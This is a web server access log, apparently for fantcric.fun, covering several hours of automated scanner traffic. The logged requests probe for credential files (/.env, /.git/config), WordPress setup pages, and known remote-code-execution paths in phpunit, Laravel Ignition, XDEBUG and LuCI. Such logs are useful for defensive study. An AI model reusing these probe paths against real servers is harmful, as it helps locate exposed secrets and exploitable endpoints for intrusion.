104.23.221.146 - - [01/Oct/2025:15:36:45 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:15:36:45 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
79.124.58.198 - - [01/Oct/2025:15:37:28 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:15:37:33 +0000] "GET / HTTP/1.1" 200 4004 "http://45.135.59.210:80/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.23.221.146 - - [01/Oct/2025:15:37:40 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
37.60.141.156 - - [01/Oct/2025:15:43:14 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 301 169 "-" "-" "-"
37.60.141.156 - - [01/Oct/2025:15:43:14 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 15847 "http://45.135.59.210:80/cgi-bin/luci/;stok=/locale" "-" "-"
195.178.110.160 - - [01/Oct/2025:15:43:50 +0000] "GET / HTTP/1.1" 400 157 "-" "-" "-"
195.178.110.160 - - [01/Oct/2025:15:43:50 +0000] "GET / HTTP/1.1" 404 22 "-" "l9tcpid/v1.1.0" "-"
195.178.110.160 - - [01/Oct/2025:15:44:32 +0000] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\xF7\x1C$\xC9\xAF\xF0\xB0\xB6w&\xDAQ\xC4\xA9\xB8\x9A\x89\xCA\xA0\x1E\xC0\x0E\x86_\x04\xBFD\xE3\xEF\xF9\x07\xB4 \xFEpo\xBC\xAEK\xB4\xE6T\xE9T\x91\x01\xC9\xF6\xEF\xA8H\xAF\xBATWOo\x11\xE0\xD9\xE6\xA3b\xE69\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 157 "-" "-" "-"
195.178.110.160 - - [01/Oct/2025:15:44:32 +0000] "GET / HTTP/1.1" 400 157 "-" "-" "-"
195.178.110.160 - - [01/Oct/2025:15:44:32 +0000] "GET / HTTP/1.1" 301 169 "-" "l9tcpid/v1.1.0" "-"
194.165.16.163 - - [01/Oct/2025:15:44:50 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 157 "-" "-" "-"
154.210.100.106 - - [01/Oct/2025:15:50:18 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
154.210.100.106 - - [01/Oct/2025:15:50:21 +0000] "GET / HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36" "-"
104.165.94.5 - - [01/Oct/2025:15:50:43 +0000] "GET / HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" "-"
104.165.94.5 - - [01/Oct/2025:15:50:46 +0000] "GET /favicon.ico HTTP/2.0" 200 3992 "https://fantcric.fun/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36" "-"
104.23.221.147 - - [01/Oct/2025:15:57:08 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
79.124.58.198 - - [01/Oct/2025:15:57:51 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:15:57:56 +0000] "GET / HTTP/1.1" 200 4004 "http://45.135.59.210:80" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.23.223.18 - - [01/Oct/2025:15:58:01 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.223.19 - - [01/Oct/2025:15:58:01 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.223.18 - - [01/Oct/2025:15:58:59 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.223.19 - - [01/Oct/2025:15:58:59 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.217.163 - - [01/Oct/2025:15:59:56 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
212.46.216.98 - - [01/Oct/2025:16:04:26 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:16:07:47 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:16:07:52 +0000] "GET /Autodiscover/Autodiscover.xml HTTP/1.1" 200 4004 "http://45.135.59.210:80/Autodiscover/Autodiscover.xml" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
142.93.216.145 - - [01/Oct/2025:16:09:26 +0000] "GET /.env HTTP/1.1" 400 255 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);" "-"
142.93.216.145 - - [01/Oct/2025:16:09:27 +0000] "GET /.git/config HTTP/1.1" 400 255 "-" "Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);" "-"
89.248.165.82 - - [01/Oct/2025:16:09:51 +0000] "GET /admin/config.php HTTP/1.1" 404 22 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:16:18:04 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:16:18:09 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 4004 "http://45.135.59.210:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.23.221.146 - - [01/Oct/2025:16:18:23 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
204.76.203.219 - - [01/Oct/2025:16:20:00 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
104.23.221.147 - - [01/Oct/2025:16:20:24 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:16:21:08 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:16:21:09 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:16:21:09 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:16:21:09 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
3.130.96.91 - - [01/Oct/2025:16:22:38 +0000] "GET / HTTP/1.1" 400 657 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
204.76.203.212 - - [01/Oct/2025:16:24:51 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46" "-"
43.135.172.123 - - [01/Oct/2025:16:25:18 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" "-"
43.135.172.123 - - [01/Oct/2025:16:25:19 +0000] "GET / HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" "-"
3.130.96.91 - - [01/Oct/2025:16:27:16 +0000] "SSH-2.0-Go" 400 157 "-" "-" "-"
132.232.144.200 - - [01/Oct/2025:16:33:39 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
132.232.144.200 - - [01/Oct/2025:16:33:48 +0000] "GET / HTTP/1.1" 200 4004 "http://www.fantcric.fun" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
79.124.58.198 - - [01/Oct/2025:16:39:47 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
172.68.183.51 - - [01/Oct/2025:16:39:49 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.68.183.52 - - [01/Oct/2025:16:39:50 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
79.124.58.198 - - [01/Oct/2025:16:39:52 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 200 4004 "http://45.135.59.210:80/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
104.23.221.146 - - [01/Oct/2025:16:39:54 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:16:39:54 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.68.183.51 - - [01/Oct/2025:16:40:47 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
37.60.141.156 - - [01/Oct/2025:16:41:28 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246" "-"
104.23.221.147 - - [01/Oct/2025:16:41:32 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
84.241.212.225 - - [01/Oct/2025:16:43:22 +0000] "GET / HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36" "-"
84.241.212.225 - - [01/Oct/2025:16:43:24 +0000] "GET /favicon.ico HTTP/2.0" 200 3992 "https://fantcric.fun/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36" "-"
4.227.36.23 - - [01/Oct/2025:16:45:11 +0000] "GET /robots.txt HTTP/2.0" 200 3992 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)" "-"
20.171.207.252 - - [01/Oct/2025:16:45:27 +0000] "GET / HTTP/2.0" 200 3992 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)" "-"
79.124.58.198 - - [01/Oct/2025:16:58:39 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:16:58:45 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 200 4004 "http://45.135.59.210:80/solr/admin/info/system?wt=json" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
172.69.151.206 - - [01/Oct/2025:17:01:21 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.69.151.205 - - [01/Oct/2025:17:01:21 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
195.178.110.109 - - [01/Oct/2025:17:02:02 +0000] "GET / HTTP/1.1" 400 157 "-" "-" "-"
195.178.110.109 - - [01/Oct/2025:17:02:02 +0000] "GET / HTTP/1.1" 404 22 "-" "l9tcpid/v1.1.0" "-"
104.23.221.146 - - [01/Oct/2025:17:02:58 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:17:03:14 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:17:05:17 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.146 - - [01/Oct/2025:17:05:17 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.239.29 - - [01/Oct/2025:17:06:03 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.239.28 - - [01/Oct/2025:17:06:03 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
79.124.58.198 - - [01/Oct/2025:17:09:16 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:17:09:21 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 4004 "http://45.135.59.210:80/?XDEBUG_SESSION_START=phpstorm" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
149.57.180.90 - - [01/Oct/2025:17:10:00 +0000] "GET / HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0" "-"
34.22.245.55 - - [01/Oct/2025:17:23:34 +0000] "GET / HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
34.22.245.55 - - [01/Oct/2025:17:23:35 +0000] "GET /cmd_sco HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
34.22.245.55 - - [01/Oct/2025:17:23:35 +0000] "GET / HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
34.22.245.55 - - [01/Oct/2025:17:23:42 +0000] "GET /cmd_sco HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" "-"
206.168.34.196 - - [01/Oct/2025:17:23:42 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
206.168.34.196 - - [01/Oct/2025:17:23:46 +0000] "PRI * HTTP/2.0" 400 157 "-" "-" "-"
104.23.221.147 - - [01/Oct/2025:17:23:52 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.221.147 - - [01/Oct/2025:17:23:52 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
206.168.34.196 - - [01/Oct/2025:17:23:56 +0000] "GET / HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
206.168.34.196 - - [01/Oct/2025:17:24:00 +0000] "GET /favicon.ico HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
104.23.223.19 - - [01/Oct/2025:17:24:15 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.223.18 - - [01/Oct/2025:17:24:16 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
206.168.34.196 - - [01/Oct/2025:17:24:36 +0000] "GET /favicon.ico HTTP/1.1" 200 4004 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
104.23.221.147 - - [01/Oct/2025:17:24:45 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.68.183.51 - - [01/Oct/2025:17:26:18 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
195.178.110.15 - - [01/Oct/2025:17:27:29 +0000] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\x98\x84\x89r%\x96\xC5\xE0\xE9\x84\xA9\xAE\xDF\xF3\xA7\x84\x0C\xFA\xE1\xC69\x8B" 400 157 "-" "-" "-"
195.178.110.15 - - [01/Oct/2025:17:27:29 +0000] "GET / HTTP/1.1" 400 157 "-" "-" "-"
195.178.110.15 - - [01/Oct/2025:17:27:29 +0000] "GET / HTTP/1.1" 301 169 "-" "l9tcpid/v1.1.0" "-"
37.60.141.156 - - [01/Oct/2025:17:36:44 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 301 169 "-" "-" "-"
37.60.141.156 - - [01/Oct/2025:17:36:44 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 200 15847 "http://45.135.59.210:80/cgi-bin/luci/;stok=/locale" "-" "-"
79.124.58.198 - - [01/Oct/2025:17:36:52 +0000] "GET /console/ HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:17:36:57 +0000] "GET /console/ HTTP/1.1" 200 4004 "http://45.135.59.210:80/console/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
176.97.210.9 - - [01/Oct/2025:17:45:27 +0000] "CONNECT api.my-ip.io:443 HTTP/1.1" 400 157 "-" "-" "-"
151.235.247.28 - - [01/Oct/2025:17:46:12 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "-"
104.23.223.80 - - [01/Oct/2025:17:46:30 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.223.19 - - [01/Oct/2025:17:47:09 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.223.18 - - [01/Oct/2025:17:47:09 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.223.19 - - [01/Oct/2025:17:47:56 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
104.23.223.19 - - [01/Oct/2025:17:47:56 +0000] "GET /wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
172.68.183.52 - - [01/Oct/2025:17:50:33 +0000] "GET /wordpress/wp-admin/setup-config.php HTTP/2.0" 200 3992 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" "2a06:98c0:3600::103"
79.124.58.198 - - [01/Oct/2025:17:52:11 +0000] "GET /_ignition/execute-solution HTTP/1.1" 301 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
79.124.58.198 - - [01/Oct/2025:17:52:17 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 4004 "http://45.135.59.210:80/_ignition/execute-solution" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
195.178.110.109 - - [01/Oct/2025:17:59:40 +0000] "\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03A4A\x04y{KVz\xBD\x94J\x15\x12+-\x04ud\xAF\xD6\xD0\xD4\xDE\xD6\xB3*gP\xAA\xFD\x1D \xE2\xA2\xBB\xB7\xF6X\xFCj4>\x14^@X\xD2]\x95_i\xF5Wg\xB5" 400 157 "-" "-" "-"
195.178.110.109 - - [01/Oct/2025:17:59:40 +0000] "GET / HTTP/1.1" 400 157 "-" "-" "-"
195.178.110.109 - - [01/Oct/2025:17:59:40 +0000] "GET / HTTP/1.1" 301 169 "-" "l9tcpid/v1.1.0" "-"
